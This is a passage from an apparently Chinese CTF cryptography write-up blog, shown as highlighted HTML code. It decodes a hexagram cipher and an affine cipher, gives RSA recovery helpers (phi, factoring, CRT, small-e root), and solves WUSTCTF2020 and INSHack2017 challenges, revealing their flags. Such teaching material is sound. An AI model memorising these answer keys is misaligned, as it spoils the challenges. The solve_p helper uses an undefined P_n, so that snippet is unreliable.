punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> mingwen    mingwen<span class="token operator">=</span>enc    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        mingwen<span class="token operator">=</span>mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span>mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这有了之后，后面的解题过程挺简单的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -- coding:UTF-8 --</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> stringenc <span class="token operator">=</span> <span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>mydisc <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span>          <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span>          <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span>          <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span>          <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span>          <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span>          <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span>          <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span>          <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span>          <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span>        <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span>        <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">decrypt1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> mingwen    mingwen <span class="token operator">=</span> enc    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        mingwen <span class="token operator">=</span> mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span> mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>    mingwen <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span class="token punctuation">)</span>decrypt1<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP</span>temp <span class="token operator">=</span> <span class="token string">"n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP"</span><span class="token triple-quoted-string string">"""def encrpyt5():    enc = ''    for i in flag:        enc += chr((a * (ord(i) - 97) + b) % 26 + 97)    return (enc)def encrypt4():    temp = ''    offset = 5    for i in range(len(enc)):        temp += chr(ord(enc[i]) - offset - i)    return (temp)"""</span><span class="token keyword">def</span> <span class="token function">decrypto4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc <span class="token operator">=</span> <span class="token string">''</span>    offset <span class="token operator">=</span> <span class="token number">5</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span>    <span class="token keyword">return</span> encletter <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token keyword">def</span> <span class="token function">decrypto5</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 没给b的仿射密码，爆破b</span>    aa <span class="token operator">=</span> <span class="token number">1</span>    b <span class="token operator">=</span> <span class="token number">7</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            aa <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        flag <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> letter<span class="token punctuation">[</span><span class="token punctuation">(</span>aa <span class="token operator">*</span> <span class="token punctuation">(</span>letter<span class="token punctuation">.</span>index<span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            <span class="token keyword">return</span> flagenc <span class="token operator">=</span> decrypto4<span class="token punctuation">(</span><span class="token punctuation">)</span>decrypto5<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token comment"># bjdcongratulationsongettingtheflag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><h3 id="各种参数的求取"><a href="#各种参数的求取" class="headerlink" title="各种参数的求取"></a>各种参数的求取</h3><h4 id="有e-d和n如何求出phi"><a href="#有e-d和n如何求出phi" class="headerlink" title="有e*d和n如何求出phi"></a>有<code>e*d</code>和<code>n</code>如何求出<code>phi</code></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">K<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>即</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">phi<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="有phi和n如何分解n"><a href="#有phi和n如何分解n" class="headerlink" title="有phi和n如何分解n"></a>有<code>phi</code>和<code>n</code>如何分解<code>n</code></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">solve_p</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> P_n<span class="token punctuation">)</span> <span class="token comment"># =p-q</span>    p <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    q <span class="token operator">=</span> n <span class="token operator">//</span> p    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="中国剩余定理求通解"><a href="#中国剩余定理求通解" class="headerlink" title="中国剩余定理求通解"></a>中国剩余定理求通解</h4><p>这个就是有几个参数求X的那个，几个式子最后可以求得未知量。</p><pre class="line-numbers language-none"><code class="language-none">def merge(a1, n1, a2, n2):    d &#x3D; gmpy2.gcd(n1, n2)    c &#x3D; a2 - a1    if c % d !&#x3D; 0:        return 0    c &#x3D; (c % n2 + n2) % n2    c &#x3D; c &#x2F;&#x2F; d    n1 &#x3D; n1 &#x2F;&#x2F; d    n2 &#x3D; n2 &#x2F;&#x2F; d    c *&#x3D; gmpy2.invert(n1, n2)    c %&#x3D; n2    c *&#x3D; n1 * d    c +&#x3D; a1    global n3    global a3    n3 &#x3D; n1 * n2 * d    a3 &#x3D; (c % n3 + n3) % n3    return 1def exCRT(a, n):    a1 &#x3D; a[0]    n1 &#x3D; n[0]    le &#x3D; len(a)    for i in range(1, le):        a2 &#x3D; a[i]        n2 &#x3D; n[i]        if not merge(a1, n1, a2, n2):            return -1        a1 &#x3D; a3        n1 &#x3D; n3    global mod    mod &#x3D; n1    return (a1 % n1 + n1) % n1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用时将a、n两个list带入即可。适合的情况为：</p><script type="math/tex; mode=display">m ^ e ≡ c \quad mod \quad n</script><p>此时的话，欲求这个<code>m^e</code>，只需有几组对应的<code>c</code>和<code>n</code>的数据即可带入上方的<code>exCRT(a,n)</code>来求。</p><h4 id="小e值时的碰撞脚本"><a href="#小e值时的碰撞脚本" class="headerlink" title="小e值时的碰撞脚本"></a>小e值时的碰撞脚本</h4><blockquote><p>RSA不免遇到这种情况，当碰到小e的时候，下面的碰撞脚本也许能派上用场</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rune</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    k<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        x<span class="token operator">=</span>c<span class="token operator">+</span>k<span class="token operator">*</span>n        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        k<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实这个脚本适用的也是下面的这个公式的情况，只不过对于这个e很小的这种情况是直接可以求出这个m，也就是明文信息的。</p><script type="math/tex; mode=display">m ^ e ≡ c \quad mod \quad n</script><h3 id="使用rsa的方式"><a href="#使用rsa的方式" class="headerlink" title="使用rsa的方式"></a>使用rsa的方式</h3><h4 id="WUSTCTF2020-情书"><a href="#WUSTCTF2020-情书" class="headerlink" title="[WUSTCTF2020]情书"></a>[WUSTCTF2020]情书</h4><pre class="line-numbers language-none"><code class="language-none">Premise: Enumerate the alphabet by 0、1、2、.....  、25Using the RSA system Encryption:0156 0821 1616 0041 0140 2130 1616 0793Public Key:2537 and 13Private Key:2537 and 937flag: wctf2020&#123;Decryption&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个题目根据提示采用的是rsa的加密系统，这里翻译一下就是</p><pre class="line-numbers language-none"><code class="language-none">n&#x3D;2537e&#x3D;13d&#x3D;937<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>大概就像是这样进行解密的</p><p><img src="/2021/05/28/CTF/image-20210726202807984.png" alt></p><p>写出一个简单的脚本即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ciphertext <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token string">'0156 0821 1616 0041 0140 2130 1616 0793'</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n<span class="token operator">=</span><span class="token number">2537</span>d<span class="token operator">=</span><span class="token number">937</span>plaintext <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> c <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    plaintext <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span> <span class="token operator">+</span> m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token comment"># iloveyou</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="INSHack2017-rsa16m"><a href="#INSHack2017-rsa16m" class="headerlink" title="[INSHack2017]rsa16m"></a>[INSHack2017]rsa16m</h4><p><strong>TAG: n、c超级大，e正常</strong></p><p>这个题给出的两个参数超级大，怎么形容呢？我打开文件用了几十秒。。。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'rsa_16m.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token 